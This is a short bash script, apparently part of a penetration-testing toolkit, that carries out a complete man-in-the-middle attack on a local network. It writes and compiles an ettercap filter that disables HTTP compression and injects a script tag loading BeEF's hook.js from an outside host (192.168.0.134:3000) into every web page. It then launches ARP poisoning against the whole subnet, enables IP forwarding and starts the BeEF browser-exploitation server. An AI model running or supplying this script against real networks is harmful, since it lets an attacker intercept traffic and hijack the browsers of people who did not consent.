#!/bin/bash

name_interface=$1
ip=$(ifconfig $name_interface 2>/dev/null|grep 'inet addr'|tr -s ' '|tr -s ':' ' '|cut -d' ' -f 4)

echo '
if (ip.proto == TCP && tcp.dst == 80) {
     if (search(DATA.data, "Accept-Encoding")) {
          replace("Accept-Encoding", "Accept-Rubbish!");
          msg("Zapped Accept-Encoding! ip.src \n"); 
     }
}

if (ip.proto == TCP && tcp.src == 80) {
    replace("<body", "<script src=http://192.168.0.134:3000/hook.js></script><body");
    replace("<BODY", "<script src=http://192.168.0.134:3000/hook.js></script><BODY");
    msg("Hook Replace ip.src \n");
}' > ../cfg/filter.etter

etterfilter -o ../cfg/filter.ef ../cfg/filter.etter
rm ../cfg/filter.etter

nohup ettercap -Tq -i $name_interface -F ../cfg/filter.ef -P autoadd -L ../data/ettercap.log -w ../data/ettercap.cap -M arp // // >/dev/null 2>/dev/null &
sleep 2
sysctl -w net.ipv4.ip_forward=1

export GEM_PATH=/var/lib/gems/1.9.2/gems
export GEM_HOME=/var/lib/gems/1.9.2/gems
cd /pentest/web/beef
nohup ruby1.9.2 beef -x >/dev/null 2>/dev/null &
